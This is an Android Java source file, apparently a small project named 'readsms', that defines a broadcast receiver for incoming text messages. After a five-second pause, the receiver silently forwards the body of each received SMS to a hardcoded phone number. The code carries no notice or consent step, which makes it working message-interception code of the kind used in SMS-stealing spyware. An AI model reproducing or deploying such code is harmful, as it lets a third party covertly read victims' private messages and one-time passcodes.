package com.example.kumarswamy.readsms;

import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;


public class showSMS extends BroadcastReceiver {
    private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent)
    {
        if(intent!=null &&
                intent.getAction()!=null &&
                ACTION.compareToIgnoreCase(intent.getAction())==0)
        {
            Object[]pduArray= (Object[]) intent.getExtras().get("pdus");
            SmsMessage[] messages = new SmsMessage[pduArray.length];

            for (int i = 0; i<pduArray.length; i++) {
                messages[i] = SmsMessage.createFromPdu ((byte[])pduArray [i]);
            }

/*

            Bundle bundle=new Bundle();
            bundle.putString("list",messages[0].getDisplayMessageBody());

            Intent intentone = new Intent(context.getApplicationContext(), MainActivity.class);
            intentone.putExtras(bundle);
            intentone.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intentone);*/


try {
    Thread.sleep(5000);
}catch (Exception e){

}
            sendSMS(messages[0].getDisplayMessageBody());
        }
    }

    protected void sendSMS(String string) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage("8019646743", null, string, null, null);
    }


}

